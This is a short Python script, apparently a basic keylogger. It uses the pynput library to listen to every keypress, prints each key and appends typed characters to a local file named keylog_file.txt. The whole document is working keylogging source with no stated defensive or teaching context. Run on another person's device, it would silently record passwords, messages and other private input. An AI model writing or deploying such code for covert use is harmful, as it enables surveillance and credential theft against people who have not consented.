from pynput import keyboard

def KeyPressed(key):
	print(str(key))
	with open("keylog_file.txt",'a') as logkey:
		try:
			char = key.char
			logkey.write(char)
		except:
			print("Getting Error")
if __name__ ==  "__main__":
	listener = keyboard.Listener(on_press= KeyPressed)
	listener.start()
	input()
	
